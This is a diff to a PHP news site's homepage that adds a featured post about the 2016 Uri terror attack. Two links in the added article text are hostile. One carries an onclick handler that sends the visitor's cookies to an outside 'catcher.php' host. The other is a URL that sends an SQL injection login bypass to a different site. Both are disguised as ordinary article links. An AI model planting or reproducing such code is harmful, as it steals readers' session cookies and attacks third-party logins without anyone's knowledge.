@@ -5,6 +5,29 @@ include 'header.php';
     <!-- begin featured -->
     <div id="featured">
 
+
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
+     <h2> <a href="/featured/20160918-uri-terror-attack.php">Uri terror attack: 17 soldiers killed, 19 injured in strike on Army camp</a></h2>
+       
+     <p class="details">Sep 18, 2016, 01.05 PM IST<a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="/images/uriattacks.png"  alt="Uri Attacks"/></a></div>
+       
+<p>
+NEW DELHI: Terrorists have killed <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank">17 Army soldiers</a> and injured 19 in a <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">suicide attack on an Army camp </a> in Kashmir. Four terrorists struck the camp close to the headquarter of the 12th Brigade at Uri in Baramulla District. This makes it one of the deadliest terrorist strikes on security forces in recent times.
+</p>
+
+<p class="readmore">[ <a href="/featured/20160918-uri-terror-attack.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
 <!-- start of post  -->
 <div class="post">
 	  
